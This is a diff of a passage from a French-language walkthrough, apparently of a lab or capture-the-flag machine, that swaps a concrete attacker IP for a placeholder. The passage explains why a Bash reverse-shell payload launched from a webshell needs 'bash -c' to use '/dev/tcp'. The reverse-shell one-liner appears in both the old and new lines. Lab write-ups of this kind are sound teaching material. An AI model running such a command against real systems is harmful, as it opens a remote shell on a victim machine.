@@ -693,7 +693,7 @@ Ensuite, depuis le webshell, tu fais exécuter à la cible une commande qui va i
 Le payload Bash utilisé est le suivant :
 
 ```bash
-bash -c 'bash -i >& /dev/tcp/10.10.16.20/4444 0>&1'
+bash -c 'bash -i >& /dev/tcp/10.10.x.x/4444 0>&1'
 ```
 
 Le point important ici est l’utilisation de `bash -c`.
@@ -704,7 +704,7 @@ Cette partie force la cible à exécuter la commande avec Bash :
 bash -c '...'
 ```
 
-C’est important, car la redirection `/dev/tcp/10.10.16.20/4444` est une fonctionnalité interprétée par Bash. Si la commande est exécutée par un autre shell, elle peut échouer.
+C’est important, car la redirection `/dev/tcp/10.10.x.x/4444` est une fonctionnalité interprétée par Bash. Si la commande est exécutée par un autre shell, elle peut échouer.
 
 La commande complète signifie donc, de manière simplifiée :
 
